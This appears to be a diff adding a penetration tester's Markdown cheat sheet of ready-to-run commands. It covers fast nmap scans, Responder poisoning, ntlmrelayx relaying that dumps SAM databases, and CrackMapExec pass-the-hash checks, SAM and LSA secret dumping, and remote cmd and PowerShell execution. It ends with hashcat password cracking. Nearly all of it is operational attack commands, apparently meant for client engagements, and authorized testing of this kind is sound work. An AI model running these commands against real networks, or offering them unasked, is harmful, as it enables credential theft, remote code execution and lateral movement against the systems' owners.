@@ -1,1 +1,68 @@
+#### Run Run ####
+
+**Mount**
+---------------------
+mount -t cifs //<ip>//<share name/ /mnt/share -o username=<username>
+
+
+**Nmap**
+--------------------
+###From @killswitch-GUI :: 
+
+Discovery - nmap -Pn -n -sS -p 21-23,25,53,111,137,139,445,80,443,8443,8080 --min-hostgroup 255 --min-rtt-timeout 0ms --max-rtt-timeout 100ms --max-retries 1 --max-scan-delay 0 --min-rate 2000 -oA CLIENT-# -vvv --open -iL <IPLIST>
+
+Full - nmap -Pn -n -sS -p- -sV --min-hostgroup 255 --min-rtt-timeout 25ms --max-rtt-timeout 100ms --max-retries 1 --max-scan-delay 0 --min-rate 1000 -oA <customer-#> -vvv --open -iL <IPLIST>
+
+**Responder/Ntlmrelayx**
+--------------------
+Responder -
+Analysis Mode - python Responder.py -I <interface> -A
+Business Mode - python Responder.py -I <interface> -r -d -w
+
+Relayx -
+DISABLE SMB and HTTP in: /usr/share/responder/Responder.conf
+cme smb <CIDR> --gen-relay-list targets.txt
+ntlmrelayx.py -tf targets.txt (dumps successfully authenticated system's SAM database)
+
+**CME**
+--------------------
+*BASIC*
+Basic System Details - cme smb <IP>
+Check User Authentication - cme smb -u <username> -p '<password>' -d <domain> <IP>
+Check User Authentication via hash - cme smb -u <username> -H <ntlm> -d <domain> <IP> --shares
+
+**ADMIN**
+cme smb -u <username> -p <password> -d <domain> <IP> --sam
+cme smb -u <username> -p <password> -d <domain> <IP> --lsa
+cme smb -u <username> -p <password> -d <domain> <IP> --shares
+cme smb -u <username> -p <password> -d <domain> <IP> --sessions
+cme smb -u <username> -p <password> -d <domain> <IP> --loggedon-users
+cme smb -u <username> -p <password> -d <domain> <IP> -x '<cmd command>
+cme smb -u <username> -p <password> -d <domain> <IP> -X <powershell command>
+
+**CS**
+--------------------
+
+**BloodH**
+--------------------
+
+**Burp**
+--------------------
+java -jar -Xmx2G /path/to/burpsuite.jar --project-file=<name>.burp
+
+Eyewitness
+--------------------
+
+Aquatone
+--------------------
+wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
+unzip aquatone_linux_amd64_1.7.0.zip
+cat <list_of_servers.txt> | aquatone 
+
+Hashcat
+--------------------
+cd hashcat
+./hashcat -w 2 -O <hashes_to_crack.txt> <wordlist.txt>
+./hashcat -w 2 -O <hashes_to_crack.txt> <wordlist.txt> -r /rules/best64.rule
+
 
